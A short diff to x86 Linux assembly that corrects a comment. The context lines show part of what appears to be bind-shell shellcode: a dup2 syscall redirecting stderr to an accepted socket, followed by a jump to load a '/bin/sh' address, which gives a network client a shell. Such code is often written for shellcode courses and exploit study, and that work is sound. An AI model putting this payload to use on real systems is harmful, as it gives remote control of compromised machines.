@@ -132,7 +132,7 @@ _start:
 
 	xor eax, eax
 	mov al, 0x3f          ; hex for 63
-	mov cl, 0x02          ; 1 for stderr
+	mov cl, 0x02          ; 2 for stderr
 	int 0x80              ; (accept), 2   -> syscall sets stderr fd to accepted sock fd
 
 	jmp short load_bin_sh_addr
